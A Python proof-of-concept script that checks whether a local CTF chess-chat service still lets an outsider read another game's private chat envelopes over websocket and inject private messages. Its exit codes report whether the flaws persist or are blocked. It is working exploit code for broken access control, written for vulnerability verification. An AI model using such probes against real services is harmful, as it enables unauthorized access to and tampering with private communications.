#!/usr/bin/env python3
"""Reproduce the local OnlyChess chat authorization flaws with synthetic data.

Exit 0 when either unauthorized read or injection still works, 10 only when both
are blocked, and 1 for an inconclusive probe error.
"""

from __future__ import annotations

import argparse
import json
import os
import secrets
import sys
import time
from pathlib import Path

import requests


PROJECT_ROOT = Path(__file__).resolve().parents[2]
CHECKER_ROOT = Path(
    os.environ.get(
        "ONLYCHESS_CHECKER_ROOT",
        PROJECT_ROOT / "vendor" / "sasctf-finals-2025" / "onlychess" / "checker",
    )
)
sys.path.insert(0, str(CHECKER_ROOT))

from client import ChessHubClient  # noqa: E402


def credential(prefix: str) -> str:
    return f"{prefix}_{secrets.token_hex(7)}"


def register(client: ChessHubClient, prefix: str) -> str:
    username = credential(prefix)
    password = credential("pw")
    client.register(username, password)
    client.login(username, password)
    return username


def probe(base_url: str, wait_seconds: float) -> dict:
    first = ChessHubClient(base_url)
    second = ChessHubClient(base_url)
    outsider = ChessHubClient(base_url)
    try:
        first_name = register(first, "arena_owner")
        second_name = register(second, "arena_peer")
        register(outsider, "arena_outsider")

        first.challenge_player(second_name)
        game_id = second.accept_challenge(first_name)
        if not game_id:
            raise AssertionError("invite acceptance did not return a game id")

        private_control = f"private-control-{secrets.token_hex(8)}"
        first.send_private_chat_message(game_id, private_control)
        time.sleep(wait_seconds)

        key_denied = False
        try:
            outsider.get_secret_chat_key(game_id)
        except requests.HTTPError as error:
            key_denied = error.response is not None and error.response.status_code == 403
        if not key_denied:
            raise AssertionError("outsider unexpectedly obtained the private-chat key")

        outsider.connect_to_chat_ws(game_id)
        time.sleep(wait_seconds)
        historical = outsider.get_chat_messages(game_id)
        exposed = [message for message in historical if message.get("is_private")]
        if exposed and not all(
            message.get("Content") and message.get("iv") for message in exposed
        ):
            raise AssertionError("private envelope did not include ciphertext and IV")

        injected_control = f"outsider-control-{secrets.token_hex(8)}"
        injection_allowed = False
        try:
            outsider.send_private_chat_message(game_id, injected_control)
            injection_allowed = True
        except requests.HTTPError:
            pass
        if injection_allowed:
            time.sleep(wait_seconds)

        return {
            "vulnerable": bool(exposed) or injection_allowed,
            "game_id": game_id,
            "key_denied": key_denied,
            "historical_private_envelopes": len(exposed),
            "injection_allowed": injection_allowed,
        }
    finally:
        first.close_all_websockets()
        second.close_all_websockets()
        outsider.close_all_websockets()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:4000")
    parser.add_argument("--wait-seconds", type=float, default=0.8)
    args = parser.parse_args()
    try:
        result = probe(args.base_url.rstrip("/"), args.wait_seconds)
    except Exception as error:
        print(json.dumps({"probe_error": str(error)}, sort_keys=True))
        return 1
    print(json.dumps(result, sort_keys=True))
    return 0 if result["vulnerable"] else 10


if __name__ == "__main__":
    raise SystemExit(main())
